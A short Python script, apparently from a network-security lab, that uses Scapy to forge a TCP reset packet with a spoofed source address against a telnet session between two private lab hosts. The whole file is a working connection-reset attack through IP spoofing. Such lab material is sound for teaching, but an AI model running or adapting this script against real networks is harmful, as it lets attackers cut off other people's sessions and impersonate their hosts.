#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5") # impersonate the user
tcp = TCP(sport=60692, dport=23, flags="R", seq=1744828212)
pkt = ip/tcp
ls(pkt)
send(pkt, iface="br-f7e04cf35ca2", verbose=0)